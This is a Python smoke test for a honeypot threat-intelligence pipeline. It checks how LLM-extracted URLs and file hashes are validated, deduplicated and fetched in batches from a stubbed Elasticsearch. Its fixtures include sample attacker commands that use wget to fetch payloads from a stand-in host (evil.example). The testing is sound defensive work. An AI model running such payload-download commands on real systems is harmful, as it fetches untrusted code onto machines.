"""Smoke test for ROADMAP #22: infrastructure miner now folds LLM-extracted
IOCs into the artifact graph alongside regex extraction.

Pre-#22 the infra miner ran only its own URL/SSH-key/hash regexes against
the raw command text. The LLM-extracted `iocs.urls` / `iocs.hashes` on
the enrichment doc were never consulted. Two extraction layers diverged:
one would find IOCs the other missed, and analysts saw IOCs on the graph
that didn't appear in any campaign and vice versa.

The fix:
  - `_validate_llm_iocs(iocs, sample_cmd)` filters LLM IOCs through the
    same context-anchoring guards as the regex miner (`_URL_RE` requires
    a scheme; bare hex hashes only fire if the command text carries a
    hash-tool keyword).
  - `_fetch_llm_iocs(es, commands_idx, hashes, sample_cmd_by_hash)` bulk-
    mgets enrichment docs by command hash and returns validated IOCs.
  - `run_mine_infrastructure` collects (sid, hash) pairs during streaming
    and overlays the LLM IOCs onto sess_arts / art_to_sessions in a
    second pass. Stats now expose `llm_iocs_added` and
    `llm_iocs_redundant_with_regex` for live observability.

Standalone — no real ES, no pytest.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_llm_ioc_overlay.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.sources.cowrie.campaigns import (
    _fetch_llm_iocs,
    _indicators_to_iocs,
    _validate_llm_iocs,
)


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


# -----------------------------------------------------------------------------
# [1] URL validation
# -----------------------------------------------------------------------------
print("\n[1] LLM URL validation — scheme required")
# Well-formed URL with scheme passes.
out = _validate_llm_iocs(
    {"urls": ["http://evil.example/m1.elf", "https://cdn.example/payload.sh"]},
    sample_cmd="wget http://evil.example/m1.elf",
)
check(
    "two well-formed URLs both pass",
    set(out) == {("url", "http://evil.example/m1.elf"), ("url", "https://cdn.example/payload.sh")},
    f"got {out}",
)

# Bare domain (no scheme) — hallucination-shaped — rejected.
out = _validate_llm_iocs(
    {"urls": ["evil.example", "//also-bad.example/payload"]},
    sample_cmd="wget evil.example",
)
check(
    "bare-domain URLs without scheme are rejected as hallucinations",
    out == [],
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [2] Hash validation — tool-context gate.
# -----------------------------------------------------------------------------
print("\n[2] LLM hash validation — bare hex needs tool-context")
# 64-char hex with hash-tool keyword in cmd → accepted.
HASH = "a" * 64
out = _validate_llm_iocs(
    {"hashes": [HASH]},
    sample_cmd="sha256sum /tmp/payload.elf",
)
check(
    "64-hex with sha256sum in cmd → accepted",
    out == [("hash", HASH)],
    f"got {out}",
)
# Same hash without any tool keyword → rejected (could be a UUID or fakefs id).
out = _validate_llm_iocs(
    {"hashes": [HASH]},
    sample_cmd="cat /tmp/payload.elf",
)
check(
    "64-hex without any tool keyword → rejected",
    out == [],
    f"got {out}",
)
# openssl dgst counts too.
out = _validate_llm_iocs(
    {"hashes": [HASH]},
    sample_cmd="openssl dgst -sha256 /tmp/x",
)
check(
    "openssl dgst counts as tool-context",
    out == [("hash", HASH)],
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [3] Wrong-length / non-hex hashes
# -----------------------------------------------------------------------------
print("\n[3] hashes must be valid hex of MD5/SHA1/SHA256 length")
out = _validate_llm_iocs(
    {"hashes": ["zzzz", "a" * 63, "a" * 32, "abcDEF" + "a" * 26]},   # 4-char, 63-char, valid 32-char MD5, valid 32-char hex
    sample_cmd="md5sum /tmp/payload",
)
# Only the valid 32-char hex strings should pass. (case is lowercased.)
expected = {("hash", "a" * 32), ("hash", ("abcDEF" + "a" * 26).lower())}
check(
    "only well-shaped hex of valid hash length passes",
    set(out) == expected,
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [4] Empty / missing / malformed input → []
# -----------------------------------------------------------------------------
print("\n[4] defensive — empty / missing inputs")
check("None iocs → []", _validate_llm_iocs(None, "") == [], "")
check("empty dict → []", _validate_llm_iocs({}, "anything") == [], "")
check("only files (not consulted) → []",
      _validate_llm_iocs({"files": ["/tmp/x"]}, "anything") == [], "")
check(
    "non-list urls field → []",
    _validate_llm_iocs({"urls": "http://x"}, "anything") == [],
    "",
)


# -----------------------------------------------------------------------------
# [5] Dedupe within one call
# -----------------------------------------------------------------------------
print("\n[5] dedupe within one iocs dict")
out = _validate_llm_iocs(
    {
        "urls": ["http://evil.example/p", "http://evil.example/p"],
        "hashes": ["a" * 64, "A" * 64],   # case-insensitive dedupe via lower()
    },
    sample_cmd="sha256sum /tmp/p; wget http://evil.example/p",
)
check(
    "duplicate URL collapsed",
    sum(1 for k, _ in out if k == "url") == 1,
    f"got {out}",
)
check(
    "case-variant hashes collapsed",
    sum(1 for k, _ in out if k == "hash") == 1,
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [5b] _indicators_to_iocs — round-trip from ECS-shaped threat.indicator
# back to the flat iocs dict that the validator consumes.
# -----------------------------------------------------------------------------
print("\n[5b] _indicators_to_iocs converts ECS indicators to flat iocs")
indicators = [
    {"type": "url", "url": {"full": "http://evil.example/x"}},
    {"type": "url", "url": {"full": "https://cdn.example/y"}},
    {"type": "file", "file": {"hash": {"sha256": "a" * 64}}},
    {"type": "file", "file": {"hash": {"sha256": "b" * 32}}},  # MD5 stored under sha256 by upstream
    {"type": "file", "file": {"name": "/tmp/x"}},              # files dropped (we don't consult them)
    {"type": "ipv4-addr", "ip": "1.2.3.4"},                    # ips dropped
    {"type": "domain-name", "domain": "evil.example"},         # domains dropped
]
iocs = _indicators_to_iocs(indicators)
check(
    "urls extracted from url.full",
    iocs["urls"] == ["http://evil.example/x", "https://cdn.example/y"],
    f"got {iocs['urls']}",
)
check(
    "hashes extracted from file.hash.* (covers all lengths stored under sha256)",
    set(iocs["hashes"]) == {"a" * 64, "b" * 32},
    f"got {iocs['hashes']}",
)
check("non-url/non-hash indicators dropped", "domains" not in iocs and "ips" not in iocs, "")
check("None input → empty flat shape", _indicators_to_iocs(None) == {"urls": [], "hashes": []}, "")
check("[] input → empty flat shape", _indicators_to_iocs([]) == {"urls": [], "hashes": []}, "")
# Defensive: malformed entries skipped silently.
out = _indicators_to_iocs([
    "not_a_dict",
    {"type": "url"},                           # missing url.full
    {"type": "url", "url": "not_a_dict"},      # url not a dict
    {"type": "file"},                          # missing file
    {"type": "file", "file": "x"},             # file not a dict
    {"type": "file", "file": {"hash": "x"}},   # hash not a dict
    {"type": "url", "url": {"full": "http://ok.example/z"}},  # this one valid
])
check(
    "malformed entries skipped, valid ones still extracted",
    out == {"urls": ["http://ok.example/z"], "hashes": []},
    f"got {out}",
)


# -----------------------------------------------------------------------------
# [6] _fetch_llm_iocs — batched mget, defensive on errors.
# -----------------------------------------------------------------------------
print("\n[6] _fetch_llm_iocs batches and is defensive")


class _StubES:
    def __init__(self, *, raise_on_first: bool = False) -> None:
        self.calls: list[dict] = []
        self.raise_on_first = raise_on_first
        self._n = 0

    def mget(self, *, index: str, ids: list[str]):
        self._n += 1
        self.calls.append({"index": index, "ids": list(ids)})
        if self.raise_on_first and self._n == 1:
            raise RuntimeError("boom")
        # Return canned enrichments for known hashes. IOCs land in
        # `threat.indicator[]` ECS-style on real docs.
        docs = []
        for i in ids:
            if i == "hash_with_url":
                docs.append({"_id": i, "found": True, "_source": {
                    "threat": {"indicator": [
                        {"type": "url", "url": {"full": "http://from-llm.example/x"}},
                    ]},
                }})
            elif i == "hash_no_iocs":
                docs.append({"_id": i, "found": True, "_source": {
                    "threat": {"indicator": []},
                }})
            else:
                docs.append({"_id": i, "found": False})
        return {"docs": docs}


# Basic mget that returns at least one IOC.
es = _StubES()
out = _fetch_llm_iocs(
    es, "commands-idx",
    {"hash_with_url", "hash_no_iocs", "hash_missing"},
    {"hash_with_url": "wget http://from-llm.example/x"},
)
check(
    "hash_with_url → [('url', 'http://from-llm.example/x')]",
    out["hash_with_url"] == [("url", "http://from-llm.example/x")],
    f"got {out['hash_with_url']}",
)
check("hash_no_iocs → []",  out["hash_no_iocs"] == [], f"got {out['hash_no_iocs']}")
check("hash_missing → []",  out["hash_missing"] == [], f"got {out['hash_missing']}")

# Empty input → empty dict, no ES call.
es = _StubES()
out = _fetch_llm_iocs(es, "commands-idx", set(), {})
check(
    "empty hashes → no ES call, empty result",
    out == {} and es.calls == [],
    f"got out={out} calls={es.calls}",
)

# Batching: 500-default batch size means 1200 ids → 3 mget calls.
es = _StubES()
many = {f"h{i}" for i in range(1200)}
_fetch_llm_iocs(es, "commands-idx", many, {})
check(
    "1200 hashes split into 3 batches at default batch_size=500",
    len(es.calls) == 3,
    f"got {len(es.calls)} calls",
)
check(
    "each batch ≤ 500 ids",
    all(len(c["ids"]) <= 500 for c in es.calls),
    f"got sizes {[len(c['ids']) for c in es.calls]}",
)
check(
    "1200 ids covered exactly once across batches",
    sum(len(c["ids"]) for c in es.calls) == 1200,
    f"got total {sum(len(c['ids']) for c in es.calls)}",
)

# Defensive: an mget exception on one batch must not abort the function.
es = _StubES(raise_on_first=True)
out = _fetch_llm_iocs(
    es, "commands-idx",
    {f"h{i}" for i in range(600)},  # exactly 2 batches; first one raises
    {},
)
check(
    "exception in one batch → function still returns the precomputed empties",
    len(out) == 600 and all(v == [] for v in out.values()),
    f"got {len(out)} entries; got sample={list(out.values())[:3]}",
)


# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
